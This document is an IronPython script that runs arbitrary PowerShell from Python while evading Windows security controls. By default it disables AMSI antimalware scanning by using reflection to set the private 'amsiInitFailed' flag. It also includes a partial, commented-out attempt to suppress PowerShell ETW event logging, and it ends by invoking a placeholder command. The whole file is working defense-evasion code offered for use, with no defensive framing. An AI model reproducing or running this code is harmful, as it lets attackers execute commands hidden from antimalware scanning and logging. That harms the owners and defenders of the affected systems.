import clr
clr.AddReference("System.Management.Automation")
from System import Guid, Environment, String
from System.Reflection import BindingFlags
from System.Management.Automation import PowerShell


def PowerShellExecute(PowerShellCode, OutString=True, BypassLogging=True, BypassAmsi=True):
    with PowerShell.Create() as ps:
        flags = BindingFlags.NonPublic | BindingFlags.Static
        if BypassLogging:
            PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
            if PSEtwLogProvider is not None:
                EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags)
                #EventProvider = Eventing.EventProvider(Guid.NewGuid())
                #EtwProvider.SetValue(None, EventProvider)

        if BypassAmsi:
            amsiUtils = ps.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils")
            if amsiUtils is not None:
                amsiUtils.GetField("amsiInitFailed", flags).SetValue(None, True)

        ps.AddScript(PowerShellCode)
        if OutString:
            ps.AddCommand("Out-String")
        results = ps.Invoke()
        output = String.Join(Environment.NewLine, results)
        ps.Commands.Clear()
        return output

print PowerShellExecute("COMMAND_TO_RUN")
